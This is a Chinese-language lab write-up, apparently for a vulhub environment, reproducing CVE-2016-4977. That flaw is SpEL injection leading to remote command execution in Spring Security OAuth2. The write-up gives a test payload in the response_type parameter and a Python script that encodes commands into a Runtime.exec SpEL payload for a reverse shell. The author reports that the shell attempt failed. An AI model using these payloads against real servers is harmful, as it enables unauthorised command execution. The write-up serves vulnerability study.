

# Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->改包--->SpEL命令执行

### 0x01漏洞介绍

​			Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。

​			影响版本

  		2.0.0-2.0.9
  		1.0.0-1.0.5

### 0x02漏洞复现

​		访问`http://your-ip:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test`。首先需要填写用户名和密码，我们这里填入`admin:admin`即可。

可见，我们输入是SpEL表达式`${233*233}`已经成功执行并返回结果：

![Spring_Security_OAuth2_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Security_OAuth2_RCE_1.jpg)

然后，我们使用[poc.py](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py)来生成反弹shell的POC（注意：[Java反弹shell的限制与绕过方式](http://www.jackson-t.ca/runtime-exec-payloads.html)）：

poc

```
#!/usr/bin/env python

message = input('Enter message to encode:')

poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])

for ch in message[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) 

poc += ')}'

print(poc)
```

![Spring_Security_OAuth2_RCE_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Security_OAuth2_RCE_2.jpg)



![Spring_Security_OAuth2_RCE_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Security_OAuth2_RCE_3.jpg)



反弹shell 显示连接 但一直连接failed不知道为啥

![Spring_Security_OAuth2_RCE_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Security_OAuth2_RCE_4.jpg)

### 

